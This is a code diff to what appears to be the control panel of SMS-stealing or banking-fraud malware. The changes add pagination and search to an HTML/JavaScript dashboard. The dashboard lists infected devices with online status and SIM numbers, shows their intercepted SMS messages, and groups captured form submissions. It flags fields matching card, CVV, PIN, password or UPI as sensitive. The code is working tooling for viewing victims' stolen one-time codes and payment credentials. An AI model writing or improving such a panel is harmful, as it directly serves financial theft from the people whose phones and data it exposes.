@@ -24,7 +24,7 @@
             #sidebar.show-mobile { transform: translateX(0); }
         }
         #login-overlay { backdrop-filter: blur(8px); }
-        .stat-card { transition: all 0.2s; cursor: pointer; border-width: 2px; flex-shrink: 0; min-width: 140px; }
+        .stat-card { transition: all 0.2s; cursor: pointer; border-width: 2px; flex-shrink: 0; min-width: 110px; padding: 8px; }
         .stat-card:active { transform: scale(0.95); }
         .stat-card.active-filter { transform: translateY(-2px); box-shadow: 0 4px 6px -1px rgb(0 0 0 / 0.1); border-color: inherit; }
 
@@ -152,22 +152,22 @@
 
         <!-- Fixed Scrollable Stats Row (Global) -->
         <div class="bg-white border-b border-slate-200 flex-shrink-0 z-20 overflow-hidden">
-            <div class="flex overflow-x-auto no-scrollbar gap-3 p-3 lg:px-6">
-                <div onclick="setFilter('all')" id="stat-card-all" class="stat-card bg-white p-3 rounded-xl shadow-sm border-blue-500 flex items-center gap-3 active-filter">
-                    <div class="w-10 h-10 bg-blue-50 text-blue-600 rounded-lg flex items-center justify-center text-lg"><i class="fas fa-users"></i></div>
-                    <div><div class="text-lg font-black leading-none" id="stat-total">0</div><div class="text-[10px] font-bold text-slate-400 uppercase tracking-widest mt-0.5">Devices</div></div>
+            <div class="flex overflow-x-auto no-scrollbar gap-2 p-3 lg:px-6">
+                <div onclick="setFilter('all')" id="stat-card-all" class="stat-card bg-white rounded-xl shadow-sm border-blue-500 flex items-center gap-2 active-filter">
+                    <div class="w-8 h-8 bg-blue-50 text-blue-600 rounded-lg flex items-center justify-center text-base"><i class="fas fa-users"></i></div>
+                    <div><div class="text-base font-black leading-none" id="stat-total">0</div><div class="text-[9px] font-bold text-slate-400 uppercase tracking-widest mt-0.5">Devices</div></div>
                 </div>
-                <div onclick="setFilter('today')" id="stat-card-today" class="stat-card bg-white p-3 rounded-xl shadow-sm border-transparent flex items-center gap-3">
-                    <div class="w-10 h-10 bg-green-50 text-green-600 rounded-lg flex items-center justify-center text-lg"><i class="fas fa-calendar-day"></i></div>
-                    <div><div class="text-lg font-black text-green-600 leading-none" id="stat-online">0</div><div class="text-[10px] font-bold text-slate-400 uppercase tracking-widest mt-0.5">Today</div></div>
+                <div onclick="setFilter('today')" id="stat-card-today" class="stat-card bg-white rounded-xl shadow-sm border-transparent flex items-center gap-2">
+                    <div class="w-8 h-8 bg-green-50 text-green-600 rounded-lg flex items-center justify-center text-base"><i class="fas fa-calendar-day"></i></div>
+                    <div><div class="text-base font-black text-green-600 leading-none" id="stat-today">0</div><div class="text-[9px] font-bold text-slate-400 uppercase tracking-widest mt-0.5">Today</div></div>
                 </div>
-                <div onclick="setFilter('msgs')" id="stat-card-msgs" class="stat-card bg-white p-3 rounded-xl shadow-sm border-transparent flex items-center gap-3">
-                    <div class="w-10 h-10 bg-indigo-50 text-indigo-600 rounded-lg flex items-center justify-center text-lg"><i class="fas fa-envelope"></i></div>
-                    <div><div class="text-lg font-black text-indigo-600 leading-none" id="stat-msgs">0</div><div class="text-[10px] font-bold text-slate-400 uppercase tracking-widest mt-0.5">SMS</div></div>
+                <div onclick="setFilter('msgs')" id="stat-card-msgs" class="stat-card bg-white rounded-xl shadow-sm border-transparent flex items-center gap-2">
+                    <div class="w-8 h-8 bg-indigo-50 text-indigo-600 rounded-lg flex items-center justify-center text-base"><i class="fas fa-envelope"></i></div>
+                    <div><div class="text-base font-black text-indigo-600 leading-none" id="stat-msgs">0</div><div class="text-[9px] font-bold text-slate-400 uppercase tracking-widest mt-0.5">SMS</div></div>
                 </div>
-                <div onclick="setFilter('forms')" id="stat-card-forms" class="stat-card bg-white p-3 rounded-xl shadow-sm border-transparent flex items-center gap-3">
-                    <div class="w-10 h-10 bg-rose-50 text-rose-600 rounded-lg flex items-center justify-center text-lg"><i class="fas fa-file-invoice"></i></div>
-                    <div><div class="text-lg font-black text-rose-600 leading-none" id="stat-forms">0</div><div class="text-[10px] font-bold text-slate-400 uppercase tracking-widest mt-0.5">Forms</div></div>
+                <div onclick="setFilter('forms')" id="stat-card-forms" class="stat-card bg-white rounded-xl shadow-sm border-transparent flex items-center gap-2">
+                    <div class="w-8 h-8 bg-rose-50 text-rose-600 rounded-lg flex items-center justify-center text-base"><i class="fas fa-file-invoice"></i></div>
+                    <div><div class="text-base font-black text-rose-600 leading-none" id="stat-forms">0</div><div class="text-[9px] font-bold text-slate-400 uppercase tracking-widest mt-0.5">Forms</div></div>
                 </div>
             </div>
         </div>
@@ -177,9 +177,23 @@
             <div id="view-dashboard" class="space-y-4">
                 <div class="bg-white rounded-xl shadow-sm border border-slate-200 px-4 py-3 flex items-center gap-3">
                     <i class="fas fa-search text-slate-400 text-sm"></i>
-                    <input type="text" id="user-search" oninput="updateDashboard()" placeholder="Search nodes or data..." class="flex-1 bg-transparent border-none outline-none text-sm font-bold text-slate-700">
+                    <input type="text" id="user-search" oninput="resetPage(); updateDashboard()" placeholder="Search nodes or data..." class="flex-1 bg-transparent border-none outline-none text-sm font-bold text-slate-700">
                 </div>
                 <div id="dashboard-list" class="space-y-3"></div>
+
+                <!-- Pagination -->
+                <div id="pagination-ctrl" class="flex flex-col gap-3 bg-white p-3 rounded-xl border border-slate-200 shadow-sm mt-4 hidden">
+                    <div class="flex items-center justify-between">
+                        <button onclick="changePage(-1)" id="prev-btn" class="bg-slate-100 text-slate-600 px-4 py-2 rounded-lg text-xs font-black uppercase disabled:opacity-50">Prev</button>
+                        <span id="page-info" class="text-[10px] font-black text-slate-500 uppercase">Page 1 of 1</span>
+                        <button onclick="changePage(1)" id="next-btn" class="bg-slate-900 text-white px-4 py-2 rounded-lg text-xs font-black uppercase disabled:opacity-50">Next</button>
+                    </div>
+                    <div class="flex items-center gap-2 border-t border-slate-100 pt-2">
+                        <span class="text-[9px] font-black text-slate-400 uppercase">Jump to:</span>
+                        <input type="number" id="jump-page-input" class="w-12 bg-slate-50 border border-slate-200 rounded px-2 py-1 text-[10px] font-black outline-none" min="1">
+                        <button onclick="jumpToPage()" class="bg-blue-600 text-white px-3 py-1 rounded text-[9px] font-black uppercase">Go</button>
+                    </div>
+                </div>
             </div>
 
             <!-- Detail View -->
@@ -348,6 +362,9 @@
     let usersData = {};
     let selectedUid = null;
     let currentFilter = 'all';
+    let permIds = {};
+    let currentPage = 1;
+    const pageSize = 15;
 
     function toggleSidebar() {
         const sb = document.getElementById('sidebar');
@@ -367,6 +384,7 @@
 
     function setFilter(f) {
         currentFilter = f;
+        currentPage = 1;
         document.querySelectorAll('.stat-card').forEach(c => {
             c.classList.remove('active-filter');
             c.classList.replace('border-blue-500', 'border-transparent');
@@ -409,85 +427,115 @@
     function updateDashboard() {
         const query = document.getElementById('user-search').value.toLowerCase();
         const uids = Object.keys(usersData);
-        let todayCount = 0, msgsCount = 0, formsCount = 0;
         const listDiv = document.getElementById('dashboard-list');
         listDiv.innerHTML = '';
 
         const now = new Date();
         const startOfToday = new Date(now.getFullYear(), now.getMonth(), now.getDate()).getTime();
 
+        // Global Stats Calculation
+        let todayCount = 0, msgsCount = 0, formsCount = 0;
         const globalSorted = [...uids].sort((a,b) => (usersData[a].I?.ca || 0) - (usersData[b].I?.ca || 0));
-        const permIds = {};
-        globalSorted.forEach((uid, idx) => permIds[uid] = idx + 1);
+        permIds = {};
+        globalSorted.forEach((uid, idx) => {
+            permIds[uid] = idx + 1;
+            const u = usersData[uid];
+            const info = u.I || {};
+            const hasSmsToday = Object.values(u.M || {}).some(m => (m.ts || 0) >= startOfToday);
+            if ((info.lo || 0) >= startOfToday || hasSmsToday) todayCount++;
+            if (Object.keys(u.M || {}).length > 0) msgsCount++;
+            if (u.F) formsCount++;
+        });
+
+        document.getElementById('stat-total').innerText = uids.length;
+        document.getElementById('stat-today').innerText = todayCount;
+        document.getElementById('stat-msgs').innerText = msgsCount;
+        document.getElementById('stat-forms').innerText = formsCount;
+
+        let filteredItems = [];
 
         if (currentFilter === 'msgs') {
-            let allMsgs = [];
             uids.forEach(uid => {
                 const u = usersData[uid];
                 const info = u.I || {};
-                const isOnline = Date.now() - (info.lo || 0) < 60000;
-                const hasSmsToday = Object.values(u.M || {}).some(m => (m.ts || 0) >= startOfToday);
-                const isToday = (info.lo || 0) >= startOfToday || hasSmsToday;
-                if(isToday) todayCount++;
-                if(u.F) formsCount++;
                 const msgs = Object.values(u.M || {});
-                if(msgs.length > 0) msgsCount++;
-                msgs.forEach(m => allMsgs.push({ ...m, uid, name: (info.m || "Unknown") }));
+                const permIdStr = "#" + (permIds[uid] || "");
+                msgs.forEach(m => {
+                    if (!query || `${info.m} ${m.s} ${m.m} ${permIdStr}`.toLowerCase().includes(query)) {
+                        filteredItems.push({ type: 'msg', ...m, uid, name: (info.m || "Unknown") });
+                    }
+                });
             });
-
-            allMsgs.sort((a,b) => (b.ts || 0) - (a.ts || 0)).forEach(m => {
-                if (!query || `${m.name} ${m.s} ${m.m}`.toLowerCase().includes(query)) {
-                    const u = usersData[m.uid];
-                    const sims = u.S || [];
-                    const simInfo = sims.find(s => s.s === m.ss);
-                    const simDisplayName = (simInfo && simInfo.n && simInfo.n !== 'Hidden') ? simInfo.n : (m.ss ? `S${m.ss}` : "");
-
-                    const card = document.createElement('div');
-                    card.className = "user-box";
-                    card.onclick = () => showUserDetails(m.uid);
-                    card.innerHTML = `
-                        <div class="flex justify-between items-start mb-2">
-                            <div class="flex items-center gap-2 flex-wrap">
-                                <span class="text-[10px] font-black text-blue-600 bg-blue-50 px-1.5 py-0.5 rounded uppercase">${m.name}</span>
-                                <span class="text-[10px] font-bold text-slate-700">${m.s}</span>
-                                ${simDisplayName ? `<span class="text-[9px] font-black text-indigo-600 bg-indigo-50 px-1 rounded">${simDisplayName}</span>` : ""}
-                            </div>
-                            <span class="text-[9px] text-slate-400 font-mono">${new Date(m.ts).toLocaleString()}</span>
-                        </div>
-                        <div class="text-sm font-bold text-slate-600 leading-snug">"${m.m}"</div>
-                    `;
-                    listDiv.appendChild(card);
-                }
-            });
+            filteredItems.sort((a,b) => (b.ts || 0) - (a.ts || 0));
         } else if (currentFilter === 'forms') {
             let userGroups = [];
             uids.forEach(uid => {
                 const u = usersData[uid];
                 const info = u.I || {};
-                const isOnline = Date.now() - (info.lo || 0) < 60000;
-                const hasSmsToday = Object.values(u.M || {}).some(m => (m.ts || 0) >= startOfToday);
-                const isToday = (info.lo || 0) >= startOfToday || hasSmsToday;
-                if(isToday) todayCount++;
-                if(Object.keys(u.M || {}).length > 0) msgsCount++;
                 if (u.F) {
-                    formsCount++;
                     const forms = Object.values(u.F).sort((a,b) => (b.ts || 0) - (a.ts || 0));
-                    userGroups.push({ uid: uid, name: info.m || "Unknown", forms: forms, lastTs: forms[0]?.ts || 0 });
+                    let searchText = (info.m || "Unknown") + " #" + (permIds[uid] || "");
+                    forms.forEach(f => { for(let k in f) searchText += " " + f[k]; });
+                    if (!query || searchText.toLowerCase().includes(query)) {
+                        userGroups.push({ type: 'form', uid: uid, name: info.m || "Unknown", forms: forms, lastTs: forms[0]?.ts || 0 });
+                    }
                 }
             });
+            filteredItems = userGroups.sort((a,b) => b.lastTs - a.lastTs);
+        } else {
+            const sorted = uids.sort((a,b) => (usersData[b].I?.ca || 0) - (usersData[a].I?.ca || 0));
+            sorted.forEach((uid) => {
+                const u = usersData[uid];
+                const info = u.I || {};
+                const hasSmsToday = Object.values(u.M || {}).some(m => (m.ts || 0) >= startOfToday);
+                const isToday = (info.lo || 0) >= startOfToday || hasSmsToday;
+                const name = (info.m || "Unknown");
+                const permIdStr = "#" + (permIds[uid] || "");
+                let matchesF = (currentFilter === 'all') || (currentFilter === 'today' && isToday);
+                if(matchesF && (!query || name.toLowerCase().includes(query) || uid.toLowerCase().includes(query) || permIdStr.includes(query))) {
+                    filteredItems.push({ type: 'user', uid: uid, ...u });
+                }
+            });
+        }
 
-            userGroups.sort((a,b) => b.lastTs - a.lastTs).forEach(ug => {
+        // Apply Pagination
+        const totalPages = Math.ceil(filteredItems.length / pageSize) || 1;
+        if (currentPage > totalPages) currentPage = totalPages;
+
+        const startIdx = (currentPage - 1) * pageSize;
+        const pageItems = filteredItems.slice(startIdx, startIdx + pageSize);
+
+        pageItems.forEach(item => {
+            if (item.type === 'msg') {
+                const u = usersData[item.uid];
+                const sims = u.S || [];
+                const simInfo = sims.find(s => s.s === item.ss);
+                const simDisplayName = (simInfo && simInfo.n && simInfo.n !== 'Hidden') ? simInfo.n : (item.ss ? `S${item.ss}` : "");
+
+                const card = document.createElement('div');
+                card.className = "user-box";
+                card.onclick = () => showUserDetails(item.uid);
+                card.innerHTML = `
+                    <div class="flex justify-between items-start mb-2">
+                        <div class="flex items-center gap-2 flex-wrap">
+                            <span class="text-[10px] font-black text-blue-600 bg-blue-50 px-1.5 py-0.5 rounded uppercase">${item.name}</span>
+                            <span class="text-[10px] font-bold text-slate-700">${item.s}</span>
+                            ${simDisplayName ? `<span class="text-[9px] font-black text-indigo-600 bg-indigo-50 px-1 rounded">${simDisplayName}</span>` : ""}
+                        </div>
+                        <span class="text-[9px] text-slate-400 font-mono">${new Date(item.ts).toLocaleString()}</span>
+                    </div>
+                    <div class="text-sm font-bold text-slate-600 leading-snug">"${item.m}"</div>
+                `;
+                listDiv.appendChild(card);
+            } else if (item.type === 'form') {
                 let fieldsHtml = "";
-                let searchText = ug.name;
                 let combinedData = {};
-                ug.forms.forEach(f => {
+                item.forms.forEach(f => {
                     for(let k in f) {
                         if(['ts','uid','name','page','timestamp'].includes(k)) continue;
                         combinedData[k] = f[k];
-                        searchText += " " + f[k];
                     }
                 });
-
                 for(let k in combinedData) {
                     const val = combinedData[k];
                     const isS = /card|cvv|pin|pass|upi/.test(k.toLowerCase());
@@ -500,93 +548,113 @@
                             </div>
                         </div>`;
                 }
-
-                if (!query || searchText.toLowerCase().includes(query)) {
-                    const card = document.createElement('div');
-                    card.className = "user-box border-l-4 border-l-rose-500";
-                    card.onclick = () => showUserDetails(ug.uid);
-                    card.innerHTML = `
-                        <div class="flex justify-between items-center mb-3 pb-2 border-b border-slate-100">
-                            <div class="flex items-center gap-2">
-                                <div class="text-[10px] font-black text-slate-300">#${permIds[ug.uid]}</div>
-                                <span class="text-[10px] font-black text-rose-600 uppercase bg-rose-50 px-2 py-0.5 rounded">${ug.name}</span>
-                            </div>
-                            <span class="text-[9px] text-slate-400 font-mono">${new Date(ug.lastTs).toLocaleTimeString()}</span>
+                const card = document.createElement('div');
+                card.className = "user-box border-l-4 border-l-rose-500";
+                card.onclick = () => showUserDetails(item.uid);
+                card.innerHTML = `
+                    <div class="flex justify-between items-center mb-3 pb-2 border-b border-slate-100">
+                        <div class="flex items-center gap-2">
+                            <div class="text-[10px] font-black text-slate-300">#${permIds[item.uid]}</div>
+                            <span class="text-[10px] font-black text-rose-600 uppercase bg-rose-50 px-2 py-0.5 rounded">${item.name}</span>
                         </div>
-                        <div class="space-y-0.5">${fieldsHtml}</div>
-                    `;
-                    listDiv.appendChild(card);
-                }
-            });
-        } else {
-            const sorted = uids.sort((a,b) => (usersData[b].I?.ca || 0) - (usersData[a].I?.ca || 0));
-            sorted.forEach((uid) => {
+                        <span class="text-[9px] text-slate-400 font-mono">${new Date(item.lastTs).toLocaleTimeString()}</span>
+                    </div>
+                    <div class="space-y-0.5">${fieldsHtml}</div>
+                `;
+                listDiv.appendChild(card);
+            } else {
+                const uid = item.uid;
                 const u = usersData[uid];
                 const info = u.I || {};
                 const sims = u.S || [];
                 const mList = Object.values(u.M || {}).sort((a,b) => (b.ts || 0) - (a.ts || 0));
                 const lastM = mList[0] || {};
                 const isOnline = Date.now() - (info.lo || 0) < 60000;
-                const hasSmsToday = Object.values(u.M || {}).some(m => (m.ts || 0) >= startOfToday);
-                const isToday = (info.lo || 0) >= startOfToday || hasSmsToday;
-                if(isToday) todayCount++;
-                if(Object.keys(u.M || {}).length > 0) msgsCount++;
-                if(u.F) formsCount++;
-                let matchesF = (currentFilter === 'all') || (currentFilter === 'today' && isToday);
                 const name = (info.m || "Unknown");
 
-                if(matchesF && (!query || name.toLowerCase().includes(query) || uid.toLowerCase().includes(query))) {
-                    const card = document.createElement('div');
-                    card.className = "user-box";
-                    card.onclick = () => showUserDetails(uid);
+                const card = document.createElement('div');
+                card.className = "user-box";
+                card.onclick = () => showUserDetails(uid);
 
-                    const s1 = sims[0]?.n || 'H';
-                    const s2 = sims[1]?.n || 'H';
+                const s1 = sims[0]?.n || 'H';
+                const s2 = sims[1]?.n || 'H';
 
-                    card.innerHTML = `
-                        <div class="flex items-center justify-between mb-3">
-                            <div class="flex items-center gap-3">
-                                <div class="text-xs font-black text-slate-300 w-5">#${permIds[uid]}</div>
-                                <div class="w-3 h-3 rounded-full ${isOnline ? 'online-dot bg-green-500' : 'bg-slate-300'}"></div>
-                                <div>
-                                    <div class="font-black text-slate-800 uppercase text-sm leading-none">${name}</div>
-                                    <div class="text-[10px] text-slate-400 mt-1 uppercase font-bold">LAST: ${formatTime(info.lo)}</div>
-                                </div>
-                            </div>
-                            <button class="bg-slate-900 text-white px-4 py-1.5 rounded-lg text-[10px] font-black uppercase">OPEN</button>
-                        </div>
-                        <div class="grid grid-cols-2 gap-2 mb-3 bg-slate-50 p-2 rounded-lg border border-slate-100">
+                card.innerHTML = `
+                    <div class="flex items-center justify-between mb-3">
+                        <div class="flex items-center gap-3">
+                            <div class="text-xs font-black text-slate-300 w-5">#${permIds[uid]}</div>
+                            <div class="w-3 h-3 rounded-full ${isOnline ? 'online-dot bg-green-500' : 'bg-slate-300'}"></div>
                             <div>
-                                <div class="flex items-center justify-between">
-                                    <span class="text-[9px] text-slate-400 font-bold uppercase">SIM 1</span>
-                                    ${s1 !== 'H' && s1 !== 'Hidden' ? `<button onclick="event.stopPropagation(); copyToClipboard('${s1}', this)" class="text-[8px] font-black text-blue-500 uppercase">Copy</button>` : ''}
-                                </div>
-                                <div class="text-xs font-black text-slate-700">${s1}</div>
-                            </div>
-                            <div>
-                                <div class="flex items-center justify-between">
-                                    <span class="text-[9px] text-slate-400 font-bold uppercase">SIM 2</span>
-                                    ${s2 !== 'H' && s2 !== 'Hidden' ? `<button onclick="event.stopPropagation(); copyToClipboard('${s2}', this)" class="text-[8px] font-black text-blue-500 uppercase">Copy</button>` : ''}
-                                </div>
-                                <div class="text-xs font-black text-slate-700">${s2}</div>
+                                <div class="font-black text-slate-800 uppercase text-sm leading-none">${name}</div>
+                                <div class="text-[10px] text-slate-400 mt-1 uppercase font-bold">LAST: ${formatTime(info.lo)}</div>
                             </div>
                         </div>
-                        <div class="bg-blue-50/50 border border-blue-100 p-3 rounded-xl">
-                            <div class="flex items-center gap-2 mb-1">
-                                <i class="fas fa-comment-dots text-blue-400 text-[10px]"></i>
-                                <span class="text-[10px] font-black text-blue-600 uppercase truncate">${lastM.s || 'WAITING'}</span>
+                        <button class="bg-slate-900 text-white px-4 py-1.5 rounded-lg text-[10px] font-black uppercase">OPEN</button>
+                    </div>
+                    <div class="grid grid-cols-2 gap-2 mb-3 bg-slate-50 p-2 rounded-lg border border-slate-100">
+                        <div>
+                            <div class="flex items-center justify-between">
+                                <span class="text-[9px] text-slate-400 font-bold uppercase">SIM 1</span>
+                                ${s1 !== 'H' && s1 !== 'Hidden' ? `<button onclick="event.stopPropagation(); copyToClipboard('${s1}', this)" class="text-[8px] font-black text-blue-500 uppercase">Copy</button>` : ''}
                             </div>
-                            <div class="text-sm font-bold text-slate-600 leading-tight">"${lastM.m || 'PENDING...'}"</div>
+                            <div class="text-xs font-black text-slate-700">${s1}</div>
                         </div>
-                    `;
-                    listDiv.appendChild(card);
-                }
-            });
+                        <div>
+                            <div class="flex items-center justify-between">
+                                <span class="text-[9px] text-slate-400 font-bold uppercase">SIM 2</span>
+                                ${s2 !== 'H' && s2 !== 'Hidden' ? `<button onclick="event.stopPropagation(); copyToClipboard('${s2}', this)" class="text-[8px] font-black text-blue-500 uppercase">Copy</button>` : ''}
+                            </div>
+                            <div class="text-xs font-black text-slate-700">${s2}</div>
+                        </div>
+                    </div>
+                    <div class="bg-blue-50/50 border border-blue-100 p-3 rounded-xl">
+                        <div class="flex items-center gap-2 mb-1">
+                            <i class="fas fa-comment-dots text-blue-400 text-[10px]"></i>
+                            <span class="text-[10px] font-black text-blue-600 uppercase truncate">${lastM.s || 'WAITING'}</span>
+                        </div>
+                        <div class="text-sm font-bold text-slate-600 leading-tight">"${lastM.m || 'PENDING...'}"</div>
+                    </div>
+                `;
+                listDiv.appendChild(card);
+            }
+        });
+
+        // Pagination UI Update
+        const pg = document.getElementById('pagination-ctrl');
+        if (filteredItems.length > pageSize) {
+            pg.classList.remove('hidden');
+            document.getElementById('page-info').innerText = `Page ${currentPage} of ${totalPages}`;
+            document.getElementById('prev-btn').disabled = currentPage === 1;
+            document.getElementById('next-btn').disabled = currentPage === totalPages;
+        } else {
+            pg.classList.add('hidden');
         }
-        document.getElementById('stat-total').innerText = uids.length;
-        document.getElementById('stat-today').innerText = todayCount;
-        document.getElementById('stat-msgs').innerText = msgsCount;
-        document.getElementById('stat-forms').innerText = formsCount;
+    }
+
+    function changePage(delta) {
+        currentPage += delta;
+        document.getElementById('content-area').scrollTo(0,0);
+        updateDashboard();
+    }
+
+    function jumpToPage() {
+        const jumpInput = document.getElementById('jump-page-input');
+        const target = parseInt(jumpInput.value);
+        const uids = Object.keys(usersData);
+        const totalPages = Math.ceil(uids.length / pageSize) || 1;
+
+        if (target >= 1 && target <= totalPages) {
+            currentPage = target;
+            document.getElementById('content-area').scrollTo(0,0);
+            updateDashboard();
+            jumpInput.value = "";
+        } else {
+            alert("Invalid Page Number");
+        }
+    }
+
+    function resetPage() {
+        currentPage = 1;
     }
 
     function showUserDetails(uid) {
@@ -615,7 +683,8 @@
         const isOnline = Date.now() - (info.lo || 0) < 60000;
 
         // Header info
-        document.getElementById('det-name').innerText = info.m || "NODE";
+        const uIdx = permIds[uid] || "";
+        document.getElementById('det-name').innerText = (uIdx ? `#${uIdx} ` : "") + (info.m || "NODE");
         const s1 = sims[0]?.n && sims[0].n !== 'Hidden' ? sims[0].n : "H";
         const s2 = sims[1]?.n && sims[1].n !== 'Hidden' ? sims[1].n : "H";
         document.getElementById('det-id').innerText = `ID: ${uid} | S1: ${s1} | S2: ${s2}`;
